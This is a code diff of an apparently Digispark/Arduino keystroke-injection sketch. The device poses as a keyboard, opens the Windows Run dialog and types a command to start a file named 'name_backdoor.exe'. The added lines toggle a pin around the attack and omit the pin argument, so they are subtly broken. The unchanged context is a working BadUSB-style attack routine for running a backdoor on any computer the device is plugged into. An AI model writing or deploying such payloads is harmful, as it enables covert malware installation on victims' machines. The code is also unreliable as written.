@@ -4,6 +4,7 @@ void setup() {
 }
 
 void loop() {
+	digitalWrite(HIGH); // Set port 1 to high logic level
 	DigiKeyboard.sendKeyStroke(0);
 	DigiKeyboard.delay(600); // wait 600 thousandths
 	DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Ctrl + R + left = open windows run
@@ -17,6 +18,7 @@ void loop() {
 	DigiKeyboard.delay(300); // wait 300 thousandths
 	DigiKeyboard.print('start name_backdoor.exe'); // run the backdoor
 	DigiKeyboard.sendKeyStroke(KEY_ENTER);// //enter/return
+	digitalWrite(LOW); // Set the port to a low logic level
 	
 	for(;;) {
 
